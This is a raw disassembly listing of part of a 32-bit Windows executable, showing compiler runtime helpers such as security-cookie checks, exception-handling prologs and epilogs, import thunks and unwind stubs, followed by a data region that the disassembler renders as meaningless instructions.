  4058d6:	jmp    0x405a4d
  4058db:	int3   
  4058dc:	int3   
  4058dd:	int3   
  4058de:	int3   
  4058df:	int3   
  4058e0:	mov    edi,edi
  4058e2:	push   ebp
  4058e3:	mov    ebp,esp
  4058e5:	push   DWORD PTR [ebp+0x14]
  4058e8:	push   DWORD PTR [ebp+0x10]
  4058eb:	push   DWORD PTR [ebp+0xc]
  4058ee:	push   DWORD PTR [ebp+0x8]
  4058f1:	push   0x405170
  4058f6:	push   0x40700c
  4058fb:	call   0x405a66
  405900:	add    esp,0x18
  405903:	pop    ebp
  405904:	ret    
  405905:	int3   
  405906:	int3   
  405907:	int3   
  405908:	int3   
  405909:	int3   
  40590a:	int3   
  40590b:	int3   
  40590c:	int3   
  40590d:	int3   
  40590e:	int3   
  40590f:	int3   
  405910:	ret    
  405911:	int3   
  405912:	int3   
  405913:	int3   
  405914:	int3   
  405915:	int3   
  405916:	jmp    DWORD PTR ds:0x4081b8
  40591c:	int3   
  40591d:	int3   
  40591e:	int3   
  40591f:	int3   
  405920:	int3   
  405921:	int3   
  405922:	jmp    DWORD PTR ds:0x4081c8
  405928:	int3   
  405929:	int3   
  40592a:	int3   
  40592b:	int3   
  40592c:	int3   
  40592d:	int3   
  40592e:	jmp    DWORD PTR ds:0x408170
  405934:	int3   
  405935:	int3   
  405936:	int3   
  405937:	int3   
  405938:	int3   
  405939:	int3   
  40593a:	jmp    DWORD PTR ds:0x4081a4
  405940:	int3   
  405941:	int3   
  405942:	int3   
  405943:	int3   
  405944:	int3   
  405945:	jmp    0x40594f
  40594a:	int3   
  40594b:	int3   
  40594c:	int3   
  40594d:	int3   
  40594e:	int3   
  40594f:	mov    edi,edi
  405951:	push   ebp
  405952:	mov    ebp,esp
  405954:	sub    esp,0x2d0
  40595a:	mov    eax,ds:0x40700c
  40595f:	xor    eax,ebp
  405961:	mov    DWORD PTR [ebp-0x4],eax
  405964:	mov    DWORD PTR [ebp-0x220],eax
  40596a:	mov    DWORD PTR [ebp-0x224],ecx
  405970:	mov    DWORD PTR [ebp-0x228],edx
  405976:	mov    DWORD PTR [ebp-0x22c],ebx
  40597c:	mov    DWORD PTR [ebp-0x230],esi
  405982:	mov    DWORD PTR [ebp-0x234],edi
  405988:	data16 mov WORD PTR [ebp-0x208],ss
  40598f:	data16 mov WORD PTR [ebp-0x214],cs
  405996:	data16 mov WORD PTR [ebp-0x238],ds
  40599d:	data16 mov WORD PTR [ebp-0x23c],es
  4059a4:	data16 mov WORD PTR [ebp-0x240],fs
  4059ab:	data16 mov WORD PTR [ebp-0x244],gs
  4059b2:	pushf  
  4059b3:	pop    DWORD PTR [ebp-0x210]
  4059b9:	mov    eax,DWORD PTR [ebp+0x4]
  4059bc:	mov    DWORD PTR [ebp-0x218],eax
  4059c2:	lea    eax,[ebp+0x4]
  4059c5:	mov    DWORD PTR [ebp-0x2d0],0x10001
  4059cf:	mov    DWORD PTR [ebp-0x20c],eax
  4059d5:	mov    eax,DWORD PTR [eax-0x4]
  4059d8:	push   0x4010f8
  4059dd:	mov    DWORD PTR [ebp-0x21c],eax
  4059e3:	call   DWORD PTR ds:0x40803c
  4059e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4059ec:	xor    ecx,ebp
  4059ee:	call   0x405170
  4059f3:	mov    esp,ebp
  4059f5:	pop    ebp
  4059f6:	ret    
  4059f7:	int3   
  4059f8:	int3   
  4059f9:	int3   
  4059fa:	int3   
  4059fb:	int3   
  4059fc:	jmp    DWORD PTR ds:0x4081c0
  405a02:	int3   
  405a03:	int3   
  405a04:	int3   
  405a05:	int3   
  405a06:	int3   
  405a07:	int3   
  405a08:	push   0x4058e0
  405a0d:	push   DWORD PTR fs:0x0
  405a14:	mov    eax,DWORD PTR [esp+0x10]
  405a18:	mov    DWORD PTR [esp+0x10],ebp
  405a1c:	lea    ebp,[esp+0x10]
  405a20:	sub    esp,eax
  405a22:	push   ebx
  405a23:	push   esi
  405a24:	push   edi
  405a25:	mov    eax,ds:0x40700c
  405a2a:	xor    DWORD PTR [ebp-0x4],eax
  405a2d:	xor    eax,ebp
  405a2f:	push   eax
  405a30:	mov    DWORD PTR [ebp-0x18],esp
  405a33:	push   DWORD PTR [ebp-0x8]
  405a36:	mov    eax,DWORD PTR [ebp-0x4]
  405a39:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405a40:	mov    DWORD PTR [ebp-0x8],eax
  405a43:	lea    eax,[ebp-0x10]
  405a46:	mov    fs:0x0,eax
  405a4c:	ret    
  405a4d:	mov    ecx,DWORD PTR [ebp-0x10]
  405a50:	mov    DWORD PTR fs:0x0,ecx
  405a57:	pop    ecx
  405a58:	pop    edi
  405a59:	pop    edi
  405a5a:	pop    esi
  405a5b:	pop    ebx
  405a5c:	mov    esp,ebp
  405a5e:	pop    ebp
  405a5f:	push   ecx
  405a60:	ret    
  405a61:	int3   
  405a62:	int3   
  405a63:	int3   
  405a64:	int3   
  405a65:	int3   
  405a66:	jmp    DWORD PTR ds:0x408164
  405a6c:	int3   
  405a6d:	int3   
  405a6e:	int3   
  405a6f:	int3   
  405a70:	int3   
  405a71:	mov    ecx,DWORD PTR [ebp-0xc]
  405a74:	mov    DWORD PTR fs:0x0,ecx
  405a7b:	pop    ecx
  405a7c:	pop    edi
  405a7d:	pop    edi
  405a7e:	pop    esi
  405a7f:	pop    ebx
  405a80:	mov    esp,ebp
  405a82:	pop    ebp
  405a83:	push   ecx
  405a84:	ret    
  405a85:	int3   
  405a86:	int3   
  405a87:	int3   
  405a88:	int3   
  405a89:	int3   
  405a8a:	mov    ecx,DWORD PTR [ebp-0x10]
  405a8d:	xor    ecx,ebp
  405a8f:	call   0x405170
  405a94:	jmp    0x405a71
  405a99:	int3   
  405a9a:	int3   
  405a9b:	int3   
  405a9c:	int3   
  405a9d:	int3   
  405a9e:	mov    ecx,DWORD PTR [ebp-0x14]
  405aa1:	xor    ecx,ebp
  405aa3:	call   0x405170
  405aa8:	jmp    0x405a71
  405aad:	int3   
  405aae:	int3   
  405aaf:	int3   
  405ab0:	int3   
  405ab1:	int3   
  405ab2:	push   eax
  405ab3:	push   DWORD PTR fs:0x0
  405aba:	lea    eax,[esp+0xc]
  405abe:	sub    esp,DWORD PTR [esp+0xc]
  405ac2:	push   ebx
  405ac3:	push   esi
  405ac4:	push   edi
  405ac5:	mov    DWORD PTR [eax],ebp
  405ac7:	mov    ebp,eax
  405ac9:	mov    eax,ds:0x40700c
  405ace:	xor    eax,ebp
  405ad0:	push   eax
  405ad1:	push   DWORD PTR [ebp-0x4]
  405ad4:	mov    DWORD PTR [ebp-0x4],0xffffffff
  405adb:	lea    eax,[ebp-0xc]
  405ade:	mov    fs:0x0,eax
  405ae4:	ret    
  405ae5:	int3   
  405ae6:	int3   
  405ae7:	int3   
  405ae8:	int3   
  405ae9:	int3   
  405aea:	push   eax
  405aeb:	push   DWORD PTR fs:0x0
  405af2:	lea    eax,[esp+0xc]
  405af6:	sub    esp,DWORD PTR [esp+0xc]
  405afa:	push   ebx
  405afb:	push   esi
  405afc:	push   edi
  405afd:	mov    DWORD PTR [eax],ebp
  405aff:	mov    ebp,eax
  405b01:	mov    eax,ds:0x40700c
  405b06:	xor    eax,ebp
  405b08:	push   eax
  405b09:	mov    DWORD PTR [ebp-0x10],eax
  405b0c:	push   DWORD PTR [ebp-0x4]
  405b0f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  405b16:	lea    eax,[ebp-0xc]
  405b19:	mov    fs:0x0,eax
  405b1f:	ret    
  405b20:	int3   
  405b21:	int3   
  405b22:	int3   
  405b23:	int3   
  405b24:	int3   
  405b25:	push   eax
  405b26:	push   DWORD PTR fs:0x0
  405b2d:	lea    eax,[esp+0xc]
  405b31:	sub    esp,DWORD PTR [esp+0xc]
  405b35:	push   ebx
  405b36:	push   esi
  405b37:	push   edi
  405b38:	mov    DWORD PTR [eax],ebp
  405b3a:	mov    ebp,eax
  405b3c:	mov    eax,ds:0x40700c
  405b41:	xor    eax,ebp
  405b43:	push   eax
  405b44:	mov    DWORD PTR [ebp-0x10],esp
  405b47:	push   DWORD PTR [ebp-0x4]
  405b4a:	mov    DWORD PTR [ebp-0x4],0xffffffff
  405b51:	lea    eax,[ebp-0xc]
  405b54:	mov    fs:0x0,eax
  405b5a:	ret    
  405b5b:	int3   
  405b5c:	int3   
  405b5d:	int3   
  405b5e:	int3   
  405b5f:	int3   
  405b60:	push   eax
  405b61:	push   DWORD PTR fs:0x0
  405b68:	lea    eax,[esp+0xc]
  405b6c:	sub    esp,DWORD PTR [esp+0xc]
  405b70:	push   ebx
  405b71:	push   esi
  405b72:	push   edi
  405b73:	mov    DWORD PTR [eax],ebp
  405b75:	mov    ebp,eax
  405b77:	mov    eax,ds:0x40700c
  405b7c:	xor    eax,ebp
  405b7e:	push   eax
  405b7f:	mov    DWORD PTR [ebp-0x14],eax
  405b82:	mov    DWORD PTR [ebp-0x10],esp
  405b85:	push   DWORD PTR [ebp-0x4]
  405b88:	mov    DWORD PTR [ebp-0x4],0xffffffff
  405b8f:	lea    eax,[ebp-0xc]
  405b92:	mov    fs:0x0,eax
  405b98:	ret    
  405b99:	int3   
  405b9a:	int3   
  405b9b:	int3   
  405b9c:	int3   
  405b9d:	int3   
  405b9e:	jmp    DWORD PTR ds:0x4081d0
  405ba4:	int3   
  405ba5:	int3   
  405ba6:	int3   
  405ba7:	int3   
  405ba8:	int3   
  405ba9:	int3   
  405baa:	int3   
  405bab:	int3   
  405bac:	int3   
  405bad:	int3   
  405bae:	int3   
  405baf:	int3   
  405bb0:	push   ecx
  405bb1:	lea    ecx,[esp+0x4]
  405bb5:	sub    ecx,eax
  405bb7:	sbb    eax,eax
  405bb9:	not    eax
  405bbb:	and    ecx,eax
  405bbd:	mov    eax,esp
  405bbf:	and    eax,0xfffff000
  405bc4:	cmp    ecx,eax
  405bc6:	jb     0x405bd2
  405bc8:	mov    eax,ecx
  405bca:	pop    ecx
  405bcb:	xchg   esp,eax
  405bcc:	mov    eax,DWORD PTR [eax]
  405bce:	mov    DWORD PTR [esp],eax
  405bd1:	ret    
  405bd2:	sub    eax,0x1000
  405bd7:	test   DWORD PTR [eax],eax
  405bd9:	jmp    0x405bc4
  405bdb:	int3   
  405bdc:	int3   
  405bdd:	int3   
  405bde:	int3   
  405bdf:	int3   
  405be0:	mov    ecx,DWORD PTR [ebp-0x10]
  405be3:	jmp    0x404684
  405be8:	mov    edx,DWORD PTR [esp+0x8]
  405bec:	lea    eax,[edx+0xc]
  405bef:	mov    ecx,DWORD PTR [edx-0x14]
  405bf2:	xor    ecx,eax
  405bf4:	call   0x405170
  405bf9:	mov    eax,0x405e74
  405bfe:	jmp    0x405b9e
  405c03:	int3   
  405c04:	int3   
  405c05:	int3   
  405c06:	int3   
  405c07:	int3   
  405c08:	lea    ecx,[ebp-0x24]
  405c0b:	jmp    0x404732
  405c10:	lea    ecx,[ebp-0x20]
  405c13:	jmp    0x404732
  405c18:	mov    edx,DWORD PTR [esp+0x8]
  405c1c:	lea    eax,[edx+0xc]
  405c1f:	mov    ecx,DWORD PTR [edx-0x34]
  405c22:	xor    ecx,eax
  405c24:	call   0x405170
  405c29:	mov    eax,0x405ea0
  405c2e:	jmp    0x405b9e
  405c33:	int3   
  405c34:	int3   
  405c35:	int3   
  405c36:	int3   
  405c37:	int3   
  405c38:	mov    ecx,DWORD PTR [ebp-0x10]
  405c3b:	add    ecx,0x4
  405c3e:	jmp    0x402221
  405c43:	mov    ecx,DWORD PTR [ebp-0x10]
  405c46:	add    ecx,0x10
  405c49:	jmp    0x4025a6
  405c4e:	mov    ecx,DWORD PTR [ebp-0x10]
  405c51:	jmp    0x404684
  405c56:	mov    edx,DWORD PTR [esp+0x8]
  405c5a:	lea    eax,[edx+0xc]
  405c5d:	mov    ecx,DWORD PTR [edx-0x14]
  405c60:	xor    ecx,eax
  405c62:	call   0x405170
  405c67:	mov    eax,0x405f3c
  405c6c:	jmp    0x405b9e
  405c71:	int3   
  405c72:	int3   
  405c73:	int3   
  405c74:	int3   
  405c75:	int3   
  405c76:	lea    ecx,[ebp-0x10]
  405c79:	jmp    0x40461f
  405c7e:	mov    edx,DWORD PTR [esp+0x8]
  405c82:	lea    eax,[edx+0xc]
  405c85:	mov    ecx,DWORD PTR [edx-0x14]
  405c88:	xor    ecx,eax
  405c8a:	call   0x405170
  405c8f:	mov    eax,0x405f78
  405c94:	jmp    0x405b9e
  405c99:	int3   
  405c9a:	int3   
  405c9b:	int3   
  405c9c:	int3   
  405c9d:	int3   
  405c9e:	lea    ecx,[ebp-0x420]
  405ca4:	jmp    0x40461f
  405ca9:	lea    ecx,[ebp-0x418]
  405caf:	jmp    0x404749
  405cb4:	mov    edx,DWORD PTR [esp+0x8]
  405cb8:	lea    eax,[edx+0xc]
  405cbb:	mov    ecx,DWORD PTR [edx-0x434]
  405cc1:	xor    ecx,eax
  405cc3:	call   0x405170
  405cc8:	mov    ecx,DWORD PTR [edx-0x8]
  405ccb:	xor    ecx,eax
  405ccd:	call   0x405170
  405cd2:	mov    eax,0x405fa4
  405cd7:	jmp    0x405b9e
  405cdc:	int3   
  405cdd:	int3   
  405cde:	int3   
  405cdf:	int3   
  405ce0:	int3   
  405ce1:	lea    ecx,[ebp-0x2118]
  405ce7:	jmp    0x404749
  405cec:	lea    ecx,[ebp-0x2118]
  405cf2:	jmp    0x404749
  405cf7:	mov    edx,DWORD PTR [esp+0x8]
  405cfb:	lea    eax,[edx+0xc]
  405cfe:	mov    ecx,DWORD PTR [edx-0x213c]
  405d04:	xor    ecx,eax
  405d06:	call   0x405170
  405d0b:	mov    ecx,DWORD PTR [edx-0x8]
  405d0e:	xor    ecx,eax
  405d10:	call   0x405170
  405d15:	mov    eax,0x40600c
  405d1a:	jmp    0x405b9e
  405d1f:	int3   
  405d20:	int3   
  405d21:	int3   
  405d22:	int3   
  405d23:	int3   
  405d24:	lea    ecx,[ebp-0x5c]
  405d27:	jmp    0x402411
  405d2c:	lea    ecx,[ebp-0x68]
  405d2f:	jmp    0x40461f
  405d34:	mov    edx,DWORD PTR [esp+0x8]
  405d38:	lea    eax,[edx+0xc]
  405d3b:	mov    ecx,DWORD PTR [edx-0x6c]
  405d3e:	xor    ecx,eax
  405d40:	call   0x405170
  405d45:	mov    ecx,DWORD PTR [edx-0x4]
  405d48:	xor    ecx,eax
  405d4a:	call   0x405170
  405d4f:	mov    eax,0x4060a8
  405d54:	jmp    0x405b9e
  405d59:	int3   
  405d5a:	int3   
  405d5b:	int3   
  405d5c:	int3   
  405d5d:	int3   
  405d5e:	lea    ecx,[ebp-0x225c]
  405d64:	jmp    0x401fac
  405d69:	lea    ecx,[ebp-0x223c]
  405d6f:	jmp    0x401fac
  405d74:	mov    edx,DWORD PTR [esp+0x8]
  405d78:	lea    eax,[edx-0x2274]
  405d7e:	mov    ecx,DWORD PTR [edx-0x2278]
  405d84:	xor    ecx,eax
  405d86:	call   0x405170
  405d8b:	add    eax,0xc
  405d8e:	mov    ecx,DWORD PTR [edx-0x8]
  405d91:	xor    ecx,eax
  405d93:	call   0x405170
  405d98:	mov    eax,0x4060dc
  405d9d:	jmp    0x405b9e
  405da2:	int3   
  405da3:	int3   
  405da4:	int3   
  405da5:	int3   
  405da6:	int3   
  405da7:	int3   
  405da8:	int3   
  405da9:	int3   
  405daa:	int3   
  405dab:	int3   
  405dac:	int3   
  405dad:	int3   
  405dae:	int3   
  405daf:	int3   
  405db0:	mov    DWORD PTR ds:0x40751c,0x4014f8
  405dba:	mov    ecx,0x40751c
  405dbf:	jmp    0x401dc4
  405dc4:	int3   
  405dc5:	int3   
  405dc6:	int3   
  405dc7:	int3   
  405dc8:	int3   
  405dc9:	int3   
  405dca:	int3   
  405dcb:	int3   
  405dcc:	int3   
  405dcd:	int3   
  405dce:	int3   
  405dcf:	int3   
  405dd0:	push   0x407568
  405dd5:	call   DWORD PTR ds:0x408114
  405ddb:	jmp    0x404808
  405de0:	int3   
  405de1:	int3   
  405de2:	int3   
  405de3:	int3   
  405de4:	int3   
  405de5:	int3   
  405de6:	int3   
  405de7:	int3   
  405de8:	int3   
  405de9:	int3   
  405dea:	int3   
  405deb:	int3   
  405dec:	int3   
  405ded:	int3   
  405dee:	int3   
  405def:	int3   
  405df0:	mov    eax,ds:0x407020
  405df5:	test   eax,eax
  405df7:	je     0x405e36
  405df9:	cmp    eax,0x2c
  405dfc:	jne    0x405e36
  405dfe:	mov    eax,ds:0x407040
  405e03:	push   esi
  405e04:	xor    esi,esi
  405e06:	test   eax,eax
  405e08:	je     0x405e18
  405e0a:	push   eax
  405e0b:	call   DWORD PTR ds:0x4081b4
  405e11:	pop    ecx
  405e12:	mov    DWORD PTR ds:0x407040,esi
  405e18:	push   0x407024
  405e1d:	mov    DWORD PTR ds:0x407044,esi
  405e23:	mov    DWORD PTR ds:0x407048,esi
  405e29:	call   DWORD PTR ds:0x408114
  405e2f:	mov    DWORD PTR ds:0x407020,esi
  405e35:	pop    esi
  405e36:	jmp    0x404834
  405e3b:	int3   
  405e3c:	int3   
  405e3d:	int3   
  405e3e:	int3   
  405e3f:	int3   
  405e40:	mov    DWORD PTR ds:0x407190,0x4010e0
  405e4a:	mov    ecx,0x407190
  405e4f:	jmp    0x4054dc
  405e54:	int3   
  405e55:	int3   
  405e56:	int3   
  405e57:	int3   
  405e58:	(bad)  
  405e59:	(bad)  
  405e5a:	(bad)  
  405e5b:	inc    DWORD PTR [eax]
  405e5d:	add    BYTE PTR [eax],al
  405e5f:	add    ah,dl
  405e61:	(bad)  
  405e62:	(bad)  
  405e63:	inc    DWORD PTR [eax]
  405e65:	add    BYTE PTR [eax],al
  405e67:	add    dh,bh
  405e69:	(bad)  
  405e6a:	(bad)  
  405e6b:	jmp    DWORD PTR [ebp+0x1d]
  405e6e:	inc    eax
  405e6f:	add    BYTE PTR [eax+0x1d],bh
  405e72:	inc    eax
  405e73:	add    BYTE PTR [edx],ah
  405e75:	add    eax,0x11993
  405e7a:	add    BYTE PTR [eax],al
  405e7c:	cwde   
  405e7d:	pop    esi
  405e7e:	inc    eax
	...
  405e93:	add    BYTE PTR [ecx],al
  405e95:	add    BYTE PTR [eax],al
  405e97:	add    bh,bh
  405e99:	(bad)  
  405e9a:	(bad)  
  405e9b:	jmp    eax
  405e9d:	pop    ebx
  405e9e:	inc    eax
  405e9f:	add    BYTE PTR [edx],ah
  405ea1:	add    eax,0x61993
  405ea6:	add    BYTE PTR [eax],al
  405ea8:	les    ebx,FWORD PTR [esi+0x40]
  405eab:	add    BYTE PTR [edx],al
  405ead:	add    BYTE PTR [eax],al
  405eaf:	add    ah,dh
  405eb1:	pop    esi
  405eb2:	inc    eax
	...
  405ebf:	add    BYTE PTR [ecx],al
  405ec1:	add    BYTE PTR [eax],al
  405ec3:	add    bh,bh
  405ec5:	(bad)  
  405ec6:	(bad)  
  405ec7:	inc    DWORD PTR [eax]
  405ec9:	add    BYTE PTR [eax],al
  405ecb:	add    bh,bh
  405ecd:	(bad)  
  405ece:	(bad)  
  405ecf:	inc    DWORD PTR [eax]
  405ed1:	add    BYTE PTR [eax],al
  405ed3:	add    bh,bh
  405ed5:	(bad)  
  405ed6:	(bad)  
  405ed7:	dec    DWORD PTR [eax]
  405ed9:	pop    esp
  405eda:	inc    eax
  405edb:	add    BYTE PTR [edx],al
  405edd:	add    BYTE PTR [eax],al
  405edf:	add    BYTE PTR [eax],al
  405ee1:	add    BYTE PTR [eax],al
  405ee3:	add    BYTE PTR [edx],al
  405ee5:	add    BYTE PTR [eax],al
  405ee7:	add    BYTE PTR [eax],al
  405ee9:	add    BYTE PTR [eax],al
  405eeb:	add    BYTE PTR [edx],al
  405eed:	add    BYTE PTR [eax],al
  405eef:	add    BYTE PTR [eax],dl
  405ef1:	pop    esp
  405ef2:	inc    eax
	...
  405efb:	add    BYTE PTR [ecx],al
  405efd:	add    BYTE PTR [eax],al
  405eff:	add    BYTE PTR [ecx],al
  405f01:	add    BYTE PTR [eax],al
  405f03:	add    BYTE PTR [edi+ebx*2],bl
  405f06:	inc    eax
  405f07:	add    BYTE PTR [ebx],al
  405f09:	add    BYTE PTR [eax],al
  405f0b:	add    BYTE PTR [ebx],al
  405f0d:	add    BYTE PTR [eax],al
  405f0f:	add    BYTE PTR [eax+eax*1],al
  405f12:	add    BYTE PTR [eax],al
  405f14:	add    DWORD PTR [eax],eax
  405f16:	add    BYTE PTR [eax],al
  405f18:	sub    al,0x5f
  405f1a:	inc    eax
  405f1b:	add    BYTE PTR [eax+0x0],al
	...
  405f26:	add    BYTE PTR [eax],al
  405f28:	mov    ch,0x22
  405f2a:	inc    eax
  405f2b:	add    BYTE PTR [eax+0x0],al
	...
  405f36:	add    BYTE PTR [eax],al
  405f38:	or     al,0x23
  405f3a:	inc    eax
  405f3b:	add    BYTE PTR [edx],ah
  405f3d:	add    eax,0x31993
  405f42:	add    BYTE PTR [eax],al
  405f44:	pusha  
  405f45:	pop    edi
  405f46:	inc    eax
	...
  405f5b:	add    BYTE PTR [ecx],al
  405f5d:	add    BYTE PTR [eax],al
  405f5f:	add    bh,bh
  405f61:	(bad)  
  405f62:	(bad)  
  405f63:	(bad)  
  405f64:	cmp    BYTE PTR [eax+eax*2+0x0],bl
  405f68:	add    BYTE PTR [eax],al
  405f6a:	add    BYTE PTR [eax],al
  405f6c:	inc    ebx
  405f6d:	pop    esp
  405f6e:	inc    eax
  405f6f:	add    bh,bh
  405f71:	(bad)  
  405f72:	(bad)  
  405f73:	dec    DWORD PTR [esi+0x5c]
  405f76:	inc    eax
  405f77:	add    BYTE PTR [edx],ah
  405f79:	add    eax,0x11993
  405f7e:	add    BYTE PTR [eax],al
  405f80:	pushf  
  405f81:	pop    edi
  405f82:	inc    eax
	...
  405f97:	add    BYTE PTR [ecx],al
  405f99:	add    BYTE PTR [eax],al
  405f9b:	add    bh,bh
  405f9d:	(bad)  
  405f9e:	(bad)  
  405f9f:	push   DWORD PTR [esi+0x5c]
  405fa2:	inc    eax
  405fa3:	add    BYTE PTR [edx],ah
  405fa5:	add    eax,0x41993
  405faa:	add    BYTE PTR [eax],al
  405fac:	enter  0x405f,0x0
  405fb0:	add    DWORD PTR [eax],eax
  405fb2:	add    BYTE PTR [eax],al
  405fb4:	call   0x40a018
	...
  405fc1:	add    BYTE PTR [eax],al
  405fc3:	add    BYTE PTR [ecx],al
  405fc5:	add    BYTE PTR [eax],al
  405fc7:	add    bh,bh
  405fc9:	(bad)  
  405fca:	(bad)  
  405fcb:	call   FWORD PTR [esi+0x405c]
  405fd1:	add    BYTE PTR [eax],al
  405fd3:	add    BYTE PTR [ecx+0x100405c],ch
  405fd9:	add    BYTE PTR [eax],al
  405fdb:	add    BYTE PTR [eax],al
  405fdd:	add    BYTE PTR [eax],al
  405fdf:	add    BYTE PTR [ecx],al
  405fe1:	add    BYTE PTR [eax],al
  405fe3:	add    BYTE PTR [eax],al
  405fe5:	add    BYTE PTR [eax],al
  405fe7:	add    BYTE PTR [edx],al
  405fe9:	add    BYTE PTR [eax],al
  405feb:	add    BYTE PTR [edx],al
  405fed:	add    BYTE PTR [eax],al
  405fef:	add    BYTE PTR [ebx],al
  405ff1:	add    BYTE PTR [eax],al
  405ff3:	add    BYTE PTR [ecx],al
  405ff5:	add    BYTE PTR [eax],al
  405ff7:	add    ah,bh
  405ff9:	pop    edi
  405ffa:	inc    eax
  405ffb:	add    BYTE PTR [eax+0x0],al
	...
  406006:	add    BYTE PTR [eax],al
  406008:	push   esp
  406009:	daa    
  40600a:	inc    eax
  40600b:	add    BYTE PTR [edx],ah
  40600d:	add    eax,0x61993
  406012:	add    BYTE PTR [eax],al
  406014:	xor    BYTE PTR [eax+0x40],ah
  406017:	add    BYTE PTR [edx],al
  406019:	add    BYTE PTR [eax],al
  40601b:	add    BYTE PTR [eax+0x60],ah
  40601e:	inc    eax
	...
  40602b:	add    BYTE PTR [ecx],al
  40602d:	add    BYTE PTR [eax],al
  40602f:	add    bh,bh
  406031:	(bad)  
  406032:	(bad)  
  406033:	jmp    ecx
  406035:	pop    esp
  406036:	inc    eax
	...
  406047:	add    bh,bh
  406049:	(bad)  
  40604a:	(bad)  
  40604b:	(bad)  
  40604c:	in     al,dx
  40604d:	pop    esp
  40604e:	inc    eax
  40604f:	add    BYTE PTR [ebx],al
  406051:	add    BYTE PTR [eax],al
  406053:	add    BYTE PTR [eax],al
  406055:	add    BYTE PTR [eax],al
  406057:	add    BYTE PTR [ebx],al
  406059:	add    BYTE PTR [eax],al
  40605b:	add    BYTE PTR [eax],al
  40605d:	add    BYTE PTR [eax],al
  40605f:	add    BYTE PTR [ecx],al
  406061:	add    BYTE PTR [eax],al
  406063:	add    BYTE PTR [ecx],al
  406065:	add    BYTE PTR [eax],al
  406067:	add    BYTE PTR [edx],al
  406069:	add    BYTE PTR [eax],al
  40606b:	add    BYTE PTR [ecx],al
  40606d:	add    BYTE PTR [eax],al
  40606f:	add    BYTE PTR [eax+0x4004060],cl
  406075:	add    BYTE PTR [eax],al
  406077:	add    BYTE PTR [eax+eax*1],al
  40607a:	add    BYTE PTR [eax],al
  40607c:	add    eax,0x1000000
  406081:	add    BYTE PTR [eax],al
  406083:	add    BYTE PTR [eax+0x40004060],bl
	...
  406091:	add    BYTE PTR [eax],al
  406093:	add    BYTE PTR ds:0x4000402c,bh
	...
  4060a1:	add    BYTE PTR [eax],al
  4060a3:	add    ch,bh
  4060a5:	sub    eax,0x5220040
  4060aa:	xchg   ebx,eax
  4060ab:	sbb    DWORD PTR [edx],eax
  4060ad:	add    BYTE PTR [eax],al
  4060af:	add    ah,cl
  4060b1:	pusha  
  4060b2:	inc    eax
	...
  4060c7:	add    BYTE PTR [ecx],al
  4060c9:	add    BYTE PTR [eax],al
  4060cb:	add    bh,bh
  4060cd:	(bad)  
  4060ce:	(bad)  
  4060cf:	jmp    DWORD PTR [ebx*2+0x40]
  4060d6:	add    BYTE PTR [eax],al
  4060d8:	sub    al,0x5d
  4060da:	inc    eax
  4060db:	add    BYTE PTR [edx],ah
  4060dd:	add    eax,0x21993
  4060e2:	add    BYTE PTR [eax],al
  4060e4:	add    BYTE PTR [ecx+0x40],ah
	...
  4060fb:	add    BYTE PTR [ecx],al
  4060fd:	add    BYTE PTR [eax],al
  4060ff:	add    bh,bh
  406101:	(bad)  
  406102:	(bad)  
  406103:	call   FWORD PTR [esi+0x5d]
  406106:	inc    eax
  406107:	add    BYTE PTR [eax],al
  406109:	add    BYTE PTR [eax],al
  40610b:	add    BYTE PTR [ecx+0x5d],ch
  40610e:	inc    eax
  40610f:	add    BYTE PTR [eax],al
  406111:	add    BYTE PTR [eax],al
  406113:	add    BYTE PTR [eax+0x70],dl
  406116:	inc    eax
  406117:	add    BYTE PTR [eax],al
  406119:	add    BYTE PTR [eax],al
  40611b:	add    bh,bh
  40611d:	(bad)  
  40611e:	(bad)  
  40611f:	inc    DWORD PTR [eax]
  406121:	add    BYTE PTR [eax],al
  406123:	add    BYTE PTR [eax+eax*1],cl
  406126:	add    BYTE PTR [eax],al
  406128:	rcl    BYTE PTR [eax+eax*2+0x0],1
  40612c:	add    BYTE PTR [eax],al
  40612e:	add    BYTE PTR [eax],al
  406130:	and    BYTE PTR [ebp+0x40],cl
  406133:	add    BYTE PTR [eax],al
  406135:	add    BYTE PTR [eax],al
  406137:	add    BYTE PTR [ecx+eiz*2],bh
  40613a:	inc    eax
  40613b:	add    BYTE PTR [edx],al
  40613d:	add    BYTE PTR [eax],al
  40613f:	add    BYTE PTR [eax+0x61],cl
  406142:	inc    eax
  406143:	add    BYTE PTR [eax],dl
  406145:	popa   
  406146:	inc    eax
  406147:	add    BYTE PTR [eax],dl
  406149:	add    BYTE PTR [eax],al
  40614b:	add    BYTE PTR [eax+0x70],ch
  40614e:	inc    eax
  40614f:	add    BYTE PTR [eax],al
  406151:	add    BYTE PTR [eax],al
  406153:	add    bh,bh
  406155:	(bad)  
  406156:	(bad)  
  406157:	inc    DWORD PTR [eax]
  406159:	add    BYTE PTR [eax],al
  40615b:	add    BYTE PTR [eax+eax*1],cl
  40615e:	add    BYTE PTR [eax],al
  406160:	ror    BYTE PTR [eax+eax*2+0x0],0x0
  406165:	add    BYTE PTR [eax],al
  406167:	add    ah,ah
  406169:	(bad)  
  40616a:	(bad)  
  40616b:	inc    DWORD PTR [eax]
  40616d:	add    BYTE PTR [eax],al
  40616f:	add    BYTE PTR [edi+edi*8+0xffff],al
  406176:	add    BYTE PTR [eax],al
  406178:	(bad)  
  406179:	(bad)  
  40617a:	(bad)  
  40617b:	jmp    esi
  40617d:	push   eax
  40617e:	inc    eax
  40617f:	add    dl,ch
  406181:	push   eax
  406182:	inc    eax
  406183:	add    dh,bh
  406185:	(bad)  
  406186:	(bad)  
  406187:	call   FWORD PTR [edx-0x51ffbfb0]
  40618d:	push   eax
  40618e:	inc    eax
  40618f:	add    ah,ah
  406191:	(bad)  
  406192:	(bad)  
  406193:	inc    DWORD PTR [eax]
  406195:	add    BYTE PTR [eax],al
  406197:	add    al,cl
  406199:	(bad)  
  40619a:	(bad)  
  40619b:	inc    DWORD PTR [eax]
  40619d:	add    BYTE PTR [eax],al
  40619f:	add    dh,bh
  4061a1:	(bad)  
  4061a2:	(bad)  
  4061a3:	inc    DWORD PTR [eax]
  4061a5:	add    BYTE PTR [eax],al
  4061a7:	add    BYTE PTR [edx],dl
  4061a9:	push   edx
  4061aa:	inc    eax
  4061ab:	add    BYTE PTR [eax],al
  4061ad:	add    BYTE PTR [eax],al
  4061af:	add    dh,bh
  4061b1:	(bad)  
  4061b2:	(bad)  
  4061b3:	inc    DWORD PTR [eax]
  4061b5:	add    BYTE PTR [eax],al
